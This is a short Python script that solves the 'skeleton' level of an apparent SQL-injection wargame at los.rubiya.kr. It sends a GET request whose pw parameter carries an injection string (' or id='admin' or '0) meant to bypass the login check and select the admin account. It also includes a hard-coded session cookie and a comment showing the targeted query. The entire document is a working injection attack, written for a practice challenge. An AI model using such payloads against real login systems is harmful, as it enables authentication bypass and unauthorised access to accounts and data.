import requests

url = "http://los.rubiya.kr/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27%20or%20id=%27admin%27%20or%20%271"

params = {
    #select id from abc where id='guest' and pw='' and 1=0
    "pw":"' or id='admin' or '0"
    #"pw":' or id='admin' or '1
}
headers = {
    "Cookie": "PHPSESSID=vaiqsfrlsquaoq5sr1pdt5a1u2"
}

res = requests.get(url, params=params, headers=headers)
print res.content